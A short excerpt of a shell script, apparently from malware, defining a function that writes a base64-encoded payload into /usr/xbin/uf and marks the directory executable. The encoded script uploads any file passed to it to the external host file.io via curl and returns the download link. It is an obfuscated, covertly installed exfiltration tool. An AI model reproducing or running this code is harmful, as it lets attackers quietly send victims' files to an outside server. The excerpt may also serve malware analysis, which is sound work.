...
person_bin() {
    ...
    echo 'IyEvYmluL2Jhc2gKZXhwb3J0IFBBVEg9Ii91c3IvbG9jYWwvc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL3NiaW46L3Vzci9iaW46L3NiaW46L2JpbiIKCmN1cmwgLXNMIC1GICJmaWxlPUAkMSIgaHR0cHM6Ly9maWxlLmlvIHwgYXdrIC1GICciJyAne3ByaW50ICQxMH0nCgo=' | base64 -d >/usr/xbin/uf
    chmod +x -R /usr/xbin
}
